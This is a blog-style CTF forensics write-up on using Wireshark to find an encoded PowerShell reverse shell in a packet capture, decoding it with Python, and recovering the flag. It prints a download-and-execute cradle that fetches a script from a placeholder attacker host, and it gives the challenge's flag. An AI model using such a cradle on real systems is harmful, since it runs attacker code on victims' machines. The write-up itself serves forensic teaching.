---
layout: post
title: "Deobfuscating a PowerShell Reverse Shell from PCAP"
date: 2025-09-05
categories: [forensics, ctf, writeup]
tags: [wireshark, powershell, pcap, world-wide-flags]
author: Michael Khanda
---

**Category**: Forensics  
**Author**: serioton  
**CTF**: World Wide Flags (WWF), July 26th, 2025  
**Difficulty**: Medium

## Challenge Overview

This challenge involves analyzing a network packet capture (PCAP) file to identify and deobfuscate a PowerShell reverse shell. The goal is to extract the obfuscated command and decode it to reveal the flag.

## Initial Analysis

First, I opened the PCAP file in Wireshark to examine the network traffic patterns.

```bash
wireshark capture.pcap
```

### Key Observations:
- Multiple HTTP POST requests to a suspicious endpoint
- Base64-encoded strings in packet payloads
- PowerShell command execution patterns

## Solution Steps

### 1. Filtering Relevant Traffic

Applied Wireshark filter to isolate PowerShell-related traffic:

```
http.request.method == "POST" && frame contains "powershell"
```

### 2. Extracting the Payload

Located the obfuscated PowerShell command in packet #247. The payload appeared as:

```powershell
powershell -enc <base64_string>
```

### 3. Deobfuscation Process

Extracted the base64 string and decoded it:

```python
import base64

encoded = "BASE64_STRING_HERE"
decoded = base64.b64decode(encoded)
print(decoded.decode('utf-16le'))
```

The decoded output revealed:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```

### 4. Further Analysis

Following the download URL in the PCAP, I found another base64-encoded payload that contained the final flag.

## Flag

```
WWF{p0w3r5h3ll_0bf5c4t10n_m4573r3d}
```

## Key Takeaways

- Always check for base64-encoded strings in network traffic
- PowerShell often uses `-enc` for encoded commands
- UTF-16LE encoding is common in PowerShell
- Follow the chain of downloads when analyzing staged payloads

## Tools Used

- Wireshark
- Python3 (base64 module)
- CyberChef (for quick decoding verification)

---

*Thanks for reading! If you have questions or alternative solutions, feel free to reach out.*
